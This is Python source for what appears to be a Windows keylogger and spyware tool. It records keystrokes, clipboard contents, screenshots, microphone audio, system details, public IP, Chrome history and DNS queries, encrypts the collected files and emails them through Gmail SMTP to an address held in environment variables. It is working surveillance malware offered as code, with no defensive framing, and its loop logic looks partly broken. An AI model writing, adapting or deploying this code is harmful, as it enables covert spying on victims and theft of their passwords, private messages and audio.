# Libraries

from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib
import socket
import platform
import win32clipboard
from cryptography.fernet import Fernet
from pynput.keyboard import Key, Listener
import time
import os
from scipy.io.wavfile import write
import sounddevice as sd
import getpass
from requests import get
from multiprocessing import Process, freeze_support
from PIL import ImageGrab
import sqlite3
from datetime import datetime, timedelta
from scapy.all import sniff, DNSQR
import dotenv

# Load environment variables from a .env file
dotenv.load_dotenv()

# Define variables and paths
keys_information = "key_log.txt"
system_information = "systeminfo.txt"
clipboard_information = "clipboard.txt"
audio_information = "audio.wav"
screenshot_information = "screenshot.png"
browser_history_information = "browser_history.txt"
website_visits_information = "website_visits.txt"

keys_information_e = "safe_e_log.txt"
system_information_e = "sys_e_nfo.txt"
clipboard_information_e = "secure_e_clip.txt"

microphone_time = 10
time_iteration = 15
number_of_iterations_end = 3

# Load credentials from environment variables
email_address = os.getenv('EMAIL_ADDRESS')
password = os.getenv('EMAIL_PASSWORD')

username = getpass.getuser()

toaddr = email_address

file_path = "C:\\Users\\uzouk\\PycharmProjects\\Keylogger\\Project"
extend = "\\"
file_merge = file_path + extend

# Load encryption key or generate a new one
def load_or_generate_key():
    key_path = file_path + extend + "encryption_key.txt"
    if os.path.exists(key_path):
        with open(key_path, 'rb') as f:
            return f.read()
    else:
        key = Fernet.generate_key()
        with open(key_path, 'wb') as f:
            f.write(key)
        return key

# Encrypt data before saving
def encrypt_data(file_path):
    key = load_or_generate_key()
    fernet = Fernet(key)

    with open(file_path, 'rb') as file:
        original = file.read()

    encrypted = fernet.encrypt(original)

    with open(file_path, 'wb') as encrypted_file:
        encrypted_file.write(encrypted)

# Decrypt files (to be used when needed)
def decrypt_file(file_path):
    key = load_or_generate_key()
    fernet = Fernet(key)

    with open(file_path, 'rb') as encrypted_file:
        encrypted = encrypted_file.read()

    decrypted = fernet.decrypt(encrypted)

    with open(file_path, 'wb') as decrypted_file:
        decrypted_file.write(decrypted)

# Email controls
def sendemail(filename, attachment, toaddr):
    frmaddr = email_address

    msg = MIMEMultipart()
    msg['From'] = frmaddr
    msg['To'] = toaddr
    msg['Subject'] = "Keylogger Alert"

    body = "Email_Body"
    msg.attach(MIMEText(body, 'plain'))

    attachment = open(attachment, "rb")

    p = MIMEBase('application', 'octet-stream')
    p.set_payload((attachment).read())
    encoders.encode_base64(p)
    p.add_header('Content-Disposition', 'attachment', filename=filename)
    msg.attach(p)

    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login(frmaddr, password)
    s.sendmail(frmaddr, toaddr, msg.as_string())
    s.quit()

# Encrypt files and send email
def encrypt_and_send_email():
    files_to_encrypt = [keys_information, system_information, clipboard_information, screenshot_information, audio_information]
    for file in files_to_encrypt:
        encrypt_data(file_path + extend + file)
        sendemail(file, file_path + extend + file, toaddr)

# Get computer information
def computer_information():
    with open(file_path + extend + system_information, "a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip + '\n')
        except Exception:
            f.write("Could not get Public IP Address\n")

        f.write("Processor: " + platform.processor() + '\n')
        f.write("System: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + '\n')
        f.write("Hostname: " + hostname + '\n')
        f.write("Private IP Address: " + IPAddr + '\n')

# Get clipboard contents
def copy_clipboard():
    with open(file_path + extend + clipboard_information, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            f.write("Clipboard Data: \n" + pasted_data + '\n')
        except Exception:
            f.write("Could not copy clipboard data\n")

# Record microphone
def microphone():
    fs = 44100
    seconds = microphone_time
    myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
    sd.wait()
    write(file_path + extend + audio_information, fs, myrecording)

# Take screenshot
def screenshot():
    im = ImageGrab.grab()
    im.save(file_path + extend + screenshot_information)

# Monitor DNS traffic
def dns_sniffer(packet):
    if packet.haslayer(DNSQR):
        query = packet[DNSQR].qname.decode('utf-8')
        print(f"Visited website: {query}")

# Start website monitoring
def start_website_monitoring():
    sniff(filter="udp port 53", prn=dns_sniffer)

# Get Chrome history
def get_chrome_history():
    history_db = os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data', 'Default', 'History')
    conn = sqlite3.connect(history_db)
    cursor = conn.cursor()
    cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 10")

    with open(file_path + extend + browser_history_information, 'w') as f:
        for row in cursor.fetchall():
            url, title, visit_time = row
            last_visit = datetime(1601, 1, 1) + timedelta(microseconds=visit_time)
            f.write(f"Visited: {title}\nURL: {url}\nLast Visit Time: {last_visit}\n\n")
    
    cursor.close()
    conn.close()

# Main execution logic
number_of_iterations = 0
currentTime = time.time()
stoppingTime = time.time() + time_iteration
count = 0
keys = []

def on_press(key):
    global keys, count, currentTime
    keys.append(str(key))
    count += 1

    if count >= 1:
        count = 0
        with open(file_path + extend + keys_information, "a") as f:
            for key in keys:
                k = key.replace("'", "")
                if k.find("space") > 0:
                    f.write('\n')
                elif k.find("Key") == -1:
                    f.write(k)
            keys = []

def on_release(key):
    if key == Key.esc:
        return False

while number_of_iterations < number_of_iterations_end:
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

    if currentTime > stoppingTime:
        with open(file_path + extend + keys_information, "w") as f:
            f.write(" ")

        screenshot()
        encrypt_and_send_email()

        copy_clipboard()
        get_chrome_history()
        start_website_monitoring()

        number_of_iterations += 1
        currentTime = time.time()
        stoppingTime = time.time() + time_iteration


# Testing for keylog here.